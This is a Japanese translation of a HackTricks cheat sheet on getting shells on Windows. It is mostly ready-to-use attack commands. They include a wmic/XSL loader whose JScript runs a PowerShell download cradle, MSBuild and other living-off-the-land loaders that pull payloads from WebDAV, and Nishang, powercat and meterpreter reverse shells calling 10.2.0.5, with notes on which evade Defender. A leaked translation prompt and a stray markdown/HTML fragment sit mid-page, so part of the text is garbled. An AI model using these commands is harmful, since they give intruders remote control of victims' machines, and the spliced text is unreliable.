**検出されました**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
ネットワークコールを実行するプロセス：**wmic.exe**\
ディスク上に書き込まれたペイロード：**IEローカルキャッシュ**

例：xslファイル：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
抽出元は[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**検出されない**

**stager wmicを使用して、非常に簡単にKoadicゾンビをダウンロードして実行できます**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

この技術を使用すると、アプリケーションホワイトリストとPowershell.exeの制限を回避できます。PSシェルが表示されるため、次のコードをダウンロードして実行してください: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**検出されない**

## **CSC**

被害者のマシンでC#コードをコンパイルします。
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
次の場所から基本的なC#リバースシェルをダウンロードできます：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**検出されません**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
ネットワークコールを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**試したことはありません**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
ネットワークコールを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**

**試していません**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershellシェル

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells**フォルダには、さまざまなシェルがあります。**Invoke-_PowerShellTcp.ps1_**をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加してください:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
犠牲者の端末でスクリプトを実行するために、ウェブサーバーでスクリプトを提供し始めます。
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defenderはそれを悪意のあるコードとして検出しません（まだ、3/04/2019）。

**TODO: 他のnishangシェルをチェックする**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

ダウンロードし、ウェブサーバーを起動し、リスナーを起動し、被害者の端末で実行します：
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defenderはそれを悪意のあるコードとして検出しません（まだ、2019年3月4日）。

**powercatが提供する他のオプション:**

バインドシェル、リバースシェル（TCP、UDP、DNS）、ポートリダイレクト、アップロード/ダウンロード、ペイロードの生成、ファイルの提供...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

パワーシェルランチャーを作成し、ファイルに保存してダウンロードして実行します。
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**悪意のあるコードとして検出されました**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

ユニコーンを使用して、メタスプロイトのバックドアのPowerShellバージョンを作成します。
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
作成したリソースを使用して、msfconsoleを起動します:

```bash
msfconsole -r <resource_file>
```

`<resource_file>`には作成したリソースファイルのパスを指定します。
```
msfconsole -r unicorn.rc
```
以下は、ハッキング手法に関する本の内容です。以下の内容は、/hive/hacktricks/generic-methodologies-and-resources/shells/windows.mdファイルからのものです。関連する英文を日本語に翻訳し、翻訳を保持して同じマークダウンとHTMLの構文を返してください。コード、ハッキング手法の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加の内容は追加しないでください。

```markdown
Start a web server serving the _powershell\_attack.txt_ file and execute in the victim:
```

```html
<p>被害者で_webサーバー_を起動し、_powershell\_attack.txt_ファイルを提供して実行します。</p>
```
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**悪意のあるコードとして検出されました**

## 詳細

[PS>Attack](https://github.com/jaredhaight/PSAttack)は、いくつかの攻撃的なPSモジュールが事前にロードされたPSコンソールです（暗号化済み）\
[WinPWN](https://github.com/SecureThisShit/WinPwn)は、いくつかの攻撃的なPSモジュールとプロキシ検出が組み込まれたPSコンソールです（IEX）

## 参考文献

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
